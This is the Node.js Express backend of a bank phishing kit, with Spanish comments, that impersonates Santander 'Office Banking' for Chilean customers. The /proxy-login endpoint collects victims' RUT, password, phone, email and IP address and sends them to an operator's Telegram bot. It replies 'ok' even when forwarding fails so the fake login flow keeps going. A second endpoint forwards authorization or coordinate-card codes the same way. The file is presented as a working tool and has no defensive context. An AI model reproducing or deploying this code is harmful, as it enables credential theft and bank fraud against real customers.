const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

// ✅ Compatibilidad con Node <18
const fetch = require("node-fetch");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  if (cfg.tipoAutorizacion === "santander") {
    return res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
  }
  if (cfg.tipoAutorizacion === "coordenadas") {
    return res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
  }
  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });
  } catch (err) {
    console.error("Error enviando a Telegram:", err.message);
    // ⚠️ No rompemos el flujo
  }
  res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
});

// Endpoint para login → enviar credenciales, correo o teléfono a Telegram
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail, telefono } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  let mensaje;

  if (mail) {
    mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
  } else {
    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}\nIP: ${ip}`;
  }

  try {
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });
  } catch (err) {
    console.error("Error enviando a Telegram:", err.message);
    // ⚠️ No devolvemos 500, devolvemos igual OK para que el frontend avance
  }

  res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
  console.log("Node version:", process.version);
});

